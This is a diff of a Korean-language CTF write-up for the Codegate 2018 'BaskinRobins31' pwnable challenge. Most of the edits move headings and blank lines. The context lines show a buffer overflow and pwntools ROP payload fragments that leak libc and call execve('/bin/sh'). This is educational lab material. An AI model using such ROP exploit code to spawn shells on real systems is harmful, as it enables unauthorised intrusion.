@@ -7,7 +7,6 @@ description = "Codegate CTF 2018 Qual pwnable challenge"
 tags = ["ctf", "pwnable", "bof", "rop"]
 +++
 ## 0x00. Introduction
-
 ``` bash
 [*] '/home/user/BaskinRobins31'
     Arch:     amd64-64-little
@@ -18,11 +17,10 @@ tags = ["ctf", "pwnable", "bof", "rop"]
 ```
 
 ### Concept
-
 베스킨라빈스 게임을 거꾸로해서 **1~3까지의 숫자를 고르면 (중요)** 31에서 빼고, 마지막 숫자 0을 부르는 사람이 지는 게임을 구현했다.
 
-## 0x01. Vulnerability
 
+## 0x01. Vulnerability
 ``` c
 __int64 __fastcall your_turn(_DWORD *a1)
 {
@@ -36,8 +34,8 @@ __int64 __fastcall your_turn(_DWORD *a1)
 
 취약점은 단순하게 내가 입력을 넣는 `your_turn()`에서 BOF가 발생한다.
 
-## 0x02. Exploit
 
+## 0x02. Exploit
 ``` python
     payload = b"1" + b"A" * 0xaf
     payload += b"B" * 8          # sfp
@@ -57,7 +55,6 @@ __int64 __fastcall your_turn(_DWORD *a1)
 ```
 
 BOF가 가능하니 ROP를 이용해서 libc leak을 했고 `execve` 주소까지는 잘 획득했다.
-
 처음에는 `system`의 주소로 exploit을 진행했는데, stack alignment 때문인지 segmentation fault가 발생해서 `execve`로 바꿨더니 성공했다.
 
 문제는 `execve`에 어떻게 `/bin/sh`를 전달하느냐인데, libc에서 찾아서 전달해도 되지만 `environ`을 이용한 stack leak으로 해결했다.
@@ -83,7 +80,7 @@ BOF가 가능하니 ROP를 이용해서 libc leak을 했고 `execve` 주소까�
 
 ``` python
     payload = b"3" + b"E" * 7
-    payload += b"/bin/sh\x00"
+    payload += b"/bin/sh\x00"                   # buf + 0x8
     payload += b"F" * (0xb0 - len(payload))
     payload += b"G" * 8
     payload += p64(bp['pppr'])
@@ -132,8 +129,8 @@ write(1, write_got, 8 - 2);
 
 Payload를 작성할 때 dummy를 다르게 구성해서 어느 payload가 전달된건지 알 수 있게끔 하려고 한건데, 이런 나비효과가 발생할 줄이야...
 
-## 0x03. Payload
 
+## 0x03. Payload
 ``` python
 from pwn import *
 from pwnlib.util.packing import p32, p64, u32, u64
